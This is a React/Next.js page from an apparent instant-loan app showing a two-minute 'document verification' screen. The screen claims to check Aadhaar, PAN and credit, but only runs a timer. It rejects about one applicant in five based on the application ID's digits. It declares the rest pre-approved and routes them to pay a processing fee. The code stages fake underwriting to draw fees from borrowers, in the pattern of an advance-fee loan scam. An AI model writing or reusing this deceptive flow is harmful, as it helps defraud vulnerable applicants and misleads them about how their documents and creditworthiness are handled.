'use client';

import React, { useState, useEffect, Suspense } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import MobileContainer from '@/components/MobileContainer';
import LoanHeader from '@/components/LoanHeader';
import LottiePlayer from '@/components/LottiePlayer';
import { apiRequest } from '@/lib/api';
import {
  CheckCircle2,
  ArrowRight,
  Sparkles,
  Search,
  FileCheck2,
  ShieldCheck,
  Zap,
  AlertCircle,
  Clock,
} from 'lucide-react';

function EliteValidationContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const appIdParam = searchParams.get('app_id');

  // Exact 2-minute (120 seconds) validation countdown
  const SCAN_DURATION = 120;
  const [timeLeft, setTimeLeft] = useState<number>(SCAN_DURATION);
  const [appId, setAppId] = useState<string | null>(appIdParam);
  const [loanApp, setLoanApp] = useState<any | null>(null);

  useEffect(() => {
    const id = appIdParam || (typeof window !== 'undefined' ? localStorage.getItem('active_elite_loan_app_id') : null);
    if (id) {
      setAppId(id);
      apiRequest(`/loan/elite-cash/${id}`).then((res) => {
        if (res && res.data) setLoanApp(res.data);
      }).catch(() => {});
    }
  }, [appIdParam]);

  // Persistent Countdown Clock using target end timestamp
  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentId = appId || appIdParam || localStorage.getItem('active_elite_loan_app_id') || 'active';
    const storageKey = `elite_scan_end_time_${currentId}`;
    const storedEnd = localStorage.getItem(storageKey);
    let targetEndTime: number;

    if (storedEnd && !isNaN(Number(storedEnd))) {
      targetEndTime = Number(storedEnd);
    } else {
      targetEndTime = Date.now() + SCAN_DURATION * 1000;
      localStorage.setItem(storageKey, String(targetEndTime));
    }

    const calcRemaining = () => {
      const diffSec = Math.max(0, Math.ceil((targetEndTime - Date.now()) / 1000));
      return Math.min(SCAN_DURATION, diffSec);
    };

    setTimeLeft(calcRemaining());

    const timer = setInterval(() => {
      const rem = calcRemaining();
      setTimeLeft(rem);
      if (rem <= 0) {
        clearInterval(timer);
      }
    }, 400);

    return () => clearInterval(timer);
  }, [appId, appIdParam]);

  const elapsed = SCAN_DURATION - timeLeft;
  const progressPercent = Math.min(100, Math.round((elapsed / SCAN_DURATION) * 100));
  const isComplete = timeLeft === 0;

  // 1 out of 5 (20%) automated rejection rule with cooling period
  const isRejected =
    loanApp?.validation_status === 'rejected_cooling' ||
    loanApp?.status === 'rejected_cooling' ||
    loanApp?.status === 'rejected' ||
    (appId ? (parseInt(String(appId).replace(/\D/g, '') || '0', 10) % 5 === 0) : false);

  // 1st minute (elapsed 0-59s) = finding animation, 2nd minute (elapsed 60-120s) = searching animation
  const isFirstMinute = elapsed < 60 && !isComplete;

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;
  const formattedTime = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;

  const handleProceedToPayment = () => {
    const targetId = appId || loanApp?.id || 'active';
    router.push(`/loan/apply/cash-loan/elite/payment?app_id=${targetId}`);
  };

  const formattedAmount = (val: number | string) => {
    const num = typeof val === 'number' ? val : parseFloat(val);
    if (isNaN(num)) return '1,00,000';
    return num.toLocaleString('en-IN');
  };

  return (
    <MobileContainer>
      <LoanHeader title="Document Verification" backHref="/loan/apply/cash-loan/elite" />

      <div className="p-4 space-y-5 flex-1 pb-32 animate-in fade-in duration-300 overflow-y-auto">
        {/* TOP STATUS */}
        <div className="text-center space-y-1.5 pt-1">
          <div className="inline-flex items-center gap-1 px-3 py-1 rounded-full text-[11px] font-black uppercase tracking-wider shadow-2xs">
            {isComplete ? (
              isRejected ? (
                <span className="flex items-center gap-1 text-rose-700 bg-rose-100 px-3 py-0.5 rounded-full border border-rose-200">
                  <AlertCircle className="w-3.5 h-3.5 text-rose-600" />
                  Status: Cooling Period Active
                </span>
              ) : (
                <span className="flex items-center gap-1 text-emerald-700 bg-emerald-100 px-3 py-0.5 rounded-full border border-emerald-200">
                  <CheckCircle2 className="w-3.5 h-3.5 text-emerald-600" />
                  All Documents &amp; Identity Details Verified
                </span>
              )
            ) : isFirstMinute ? (
              <span className="flex items-center gap-1 bg-purple-100 text-purple-900 border border-purple-200 px-3 py-0.5 rounded-full">
                <FileCheck2 className="w-3.5 h-3.5 text-purple-600" />
                Stage 1 of 2: Validating Your Document Details (1st Min)
              </span>
            ) : (
              <span className="flex items-center gap-1 text-indigo-700 bg-purple-100 border border-purple-200 px-3 py-0.5 rounded-full">
                <Search className="w-3.5 h-3.5 text-indigo-600" />
                Stage 2 of 2: Searching Credit &amp; Policy Matrix (2nd Min)
              </span>
            )}
          </div>

          <h1 className="text-xl font-black text-slate-900">
            {isComplete
              ? isRejected
                ? 'Pre-Approval Not Granted'
                : 'Document Validation Successful! 🎉'
              : isFirstMinute
              ? 'Validating Your Document Details'
              : 'Searching Credit & Underwriting Parameters'}
          </h1>
          <p className="text-xs text-slate-500 max-w-xs mx-auto leading-relaxed font-medium">
            {isComplete
              ? isRejected
                ? 'Based on automated underwriting parameters, your profile does not meet pre-approval criteria at this time.'
                : 'Your documents and profile have been approved for express disbursal.'
              : isFirstMinute
              ? 'Scanning identity documents, cross-verifying Aadhaar & PAN details, and checking applicant credentials...'
              : 'Evaluating credit parameters, affordability, and approving express sanction limits...'}
          </p>
        </div>

        {/* 🎬 LOTTIE ANIMATION CONTAINER (1st min = Finding, 2nd min = Searching) */}
        <div className="bg-white border-2 border-purple-100 rounded-3xl p-5 shadow-sm text-center space-y-4 max-w-sm mx-auto">
          <div className="relative w-56 h-56 mx-auto flex items-center justify-center bg-slate-50/70 rounded-2xl p-2 border border-slate-100 overflow-hidden">
            {isComplete ? (
              isRejected ? (
                <div className="w-32 h-32 rounded-full bg-rose-50 border-4 border-rose-500 flex flex-col items-center justify-center text-rose-600 animate-in zoom-in-75 duration-300 shadow-lg shadow-rose-500/20 space-y-1">
                  <AlertCircle className="w-14 h-14" />
                  <span className="text-[11px] font-black text-rose-700 uppercase tracking-wide">Cooldown</span>
                </div>
              ) : (
                <div className="w-32 h-32 rounded-full bg-emerald-50 border-4 border-emerald-500 flex flex-col items-center justify-center text-emerald-600 animate-in zoom-in-75 duration-300 shadow-lg shadow-emerald-500/20 space-y-1">
                  <CheckCircle2 className="w-14 h-14" />
                  <span className="text-[11px] font-black text-emerald-700 uppercase tracking-wide">Approved</span>
                </div>
              )
            ) : (
              <div className="w-full h-full flex items-center justify-center relative">
                {/* 1st Minute: Finding Animation */}
                {isFirstMinute && (
                  <LottiePlayer
                    key="anim-finding"
                    animationPath="/animations/finding.json"
                    className="w-full h-full"
                  />
                )}

                {/* 2nd Minute: Searching Animation */}
                {!isFirstMinute && (
                  <LottiePlayer
                    key="anim-searching"
                    animationPath="/animations/searching.json"
                    className="w-full h-full"
                  />
                )}

                {/* Floating Timer Pill */}
                <div className="absolute bottom-2 right-2 bg-slate-900/80 backdrop-blur-md text-white text-[10px] font-mono font-bold px-2.5 py-1 rounded-full border border-white/20 shadow-md flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-purple-400 animate-pulse" />
                  <span>{formattedTime}</span>
                </div>
              </div>
            )}
          </div>

          {/* Progress Bar & Status Text */}
          <div className="space-y-2">
            <div className="flex items-center justify-between text-[11px] font-bold">
              <span className="text-slate-500">
                {isComplete
                  ? isRejected
                    ? 'Evaluation Finished'
                    : 'Completed'
                  : isFirstMinute
                  ? 'Phase 1: Validating Document Details'
                  : 'Phase 2: Searching Credit Line'}
              </span>
              <span className="font-mono text-purple-700 font-extrabold">{progressPercent}%</span>
            </div>
            <div className="w-full bg-slate-100 rounded-full h-2.5 overflow-hidden p-0.5 border border-slate-200">
              <div
                className={`h-full rounded-full transition-all duration-500 ${
                  isComplete
                    ? isRejected
                      ? 'bg-rose-500'
                      : 'bg-emerald-500'
                    : isFirstMinute
                    ? 'bg-gradient-to-r from-purple-600 via-indigo-600 to-purple-700'
                    : 'bg-gradient-to-r from-indigo-600 via-purple-600 to-emerald-500'
                }`}
                style={{ width: `${progressPercent}%` }}
              />
            </div>
          </div>
        </div>

        {/* BOTTOM ACTION & SUMMARY */}
        {isComplete ? (
          isRejected ? (
            /* ================= COOLING PERIOD / REJECTION VIEW ================= */
            <div className="space-y-3 animate-in slide-in-from-bottom-2 duration-300 pt-1">
              <div className="bg-rose-50 border-2 border-rose-200 rounded-3xl p-4.5 shadow-sm space-y-3">
                <div className="flex items-center justify-between border-b border-rose-200/80 pb-2">
                  <span className="text-xs font-black text-rose-950 flex items-center gap-1.5">
                    <Clock className="w-4 h-4 text-rose-600" />
                    Please Try Again After Sometime
                  </span>
                  <span className="text-[10px] font-bold font-mono bg-rose-200/60 text-rose-900 px-2 py-0.5 rounded-md">
                    Cooldown (30 Days)
                  </span>
                </div>

                <div className="space-y-2 text-xs text-slate-700 leading-relaxed">
                  <p className="font-medium">
                    Our credit underwriting algorithms could not grant instant pre-approval for this application.
                  </p>
                  <div className="bg-white/90 p-3 rounded-2xl border border-rose-100 space-y-1 text-[11px]">
                    <div className="flex items-start gap-1.5">
                      <span className="text-rose-600 font-bold">•</span>
                      <span><strong>Cooling Period:</strong> You may re-apply after 30 to 90 days.</span>
                    </div>
                    <div className="flex items-start gap-1.5">
                      <span className="text-rose-600 font-bold">•</span>
                      <span><strong>Credit Bureau Safety:</strong> This automated check does not impact external CIBIL records.</span>
                    </div>
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-2">
                <button
                  type="button"
                  onClick={() => router.push('/dashboard')}
                  className="w-full py-3.5 bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs rounded-2xl shadow-md transition-all active:scale-[0.99] cursor-pointer"
                >
                  Return to Dashboard
                </button>
                <button
                  type="button"
                  onClick={() => router.push('/loan/apply')}
                  className="w-full py-3.5 bg-purple-700 hover:bg-purple-800 text-white font-bold text-xs rounded-2xl shadow-md transition-all active:scale-[0.99] cursor-pointer"
                >
                  Other Loan Options
                </button>
              </div>
            </div>
          ) : (
            /* ================= APPROVED VIEW ================= */
            <div className="space-y-3 animate-in slide-in-from-bottom-2 duration-300 pt-1">
              <div className="bg-gradient-to-br from-purple-900 via-indigo-900 to-slate-900 text-white rounded-3xl p-4.5 shadow-md space-y-2.5">
                <div className="flex items-center justify-between border-b border-purple-800/60 pb-2">
                  <span className="text-[11px] font-bold text-purple-200 flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4 text-emerald-400" />
                    Fast-Track Sanction Reserved
                  </span>
                  <span className="text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-300 px-2 py-0.5 rounded-md border border-emerald-400/30">
                    Pre-Approved ✓
                  </span>
                </div>
                <div className="flex items-center justify-between">
                  <div>
                    <span className="text-[10px] text-purple-300 uppercase tracking-wider block font-medium">
                      Pre-Approved Amount
                    </span>
                    <span className="text-xl font-black text-emerald-400 font-mono">
                      ₹{formattedAmount(loanApp?.required_amount || loanApp?.selected_amount || 100000)}
                    </span>
                  </div>
                  <div className="text-right">
                    <span className="text-[10px] text-purple-300 uppercase tracking-wider block font-medium">
                      Disbursal Protocol
                    </span>
                    <span className="text-xs font-bold text-white">Up to 3 Days</span>
                  </div>
                </div>
              </div>

              <button
                type="button"
                onClick={handleProceedToPayment}
                className="w-full py-4 bg-gradient-to-r from-purple-700 via-indigo-700 to-purple-800 hover:from-purple-800 hover:to-indigo-800 text-white font-black text-sm rounded-2xl shadow-xl flex items-center justify-center gap-2 transition-all active:scale-[0.99] cursor-pointer"
              >
                <span>Proceed to Processing Fee Payment</span>
                <ArrowRight className="w-5 h-5" />
              </button>
            </div>
          )
        ) : (
          <div className="p-3.5 bg-purple-50 border border-purple-200 rounded-2xl text-center space-y-1 shadow-2xs">
            <p className="text-xs font-bold text-purple-950 flex items-center justify-center gap-1.5">
              <Zap className="w-3.5 h-3.5 text-purple-600 fill-purple-600" />
              Automated 2-Minute AI Verification Engine
            </p>
            <p className="text-[11px] text-purple-700 font-medium">
              Please keep this screen open while our credit engine completes validation.
            </p>
          </div>
        )}
      </div>
    </MobileContainer>
  );
}

export default function EliteLoanValidationPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen flex items-center justify-center bg-slate-900 text-white">
          <div className="text-center space-y-3">
            <div className="w-10 h-10 border-4 border-purple-500 border-t-transparent rounded-full animate-spin mx-auto" />
            <p className="text-sm font-bold text-purple-300">Loading...</p>
          </div>
        </div>
      }
    >
      <EliteValidationContent />
    </Suspense>
  );
}
